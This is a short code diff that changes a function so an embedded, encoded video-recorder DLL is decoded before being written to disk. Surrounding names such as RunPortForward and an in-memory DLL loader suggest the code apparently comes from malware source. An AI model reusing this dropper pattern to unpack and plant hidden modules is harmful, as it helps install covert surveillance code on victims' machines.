@@ -874,5 +874,14 @@ TVideoRecDLL* RunPortForward( const char* ip )
 
 bool SaveVideoDll( const char* nameFile )
 {
-	return File::WriteBufferA( (char*)nameFile, VideoRecorder::data, sizeof(VideoRecorder::data) ) > 0;
+	void* dataDll;
+	DWORD sizeDll;
+	bool neededDel;
+	if( TMemoryDLL::DecodeDll( VideoRecorder::data, sizeDll, dataDll, neededDel ) )
+	{
+		bool res = File::WriteBufferA( (char*)nameFile, dataDll, sizeDll ) > 0;
+		if( neededDel ) MemFree(dataDll);
+		return res;
+	}
+	return false;
 }
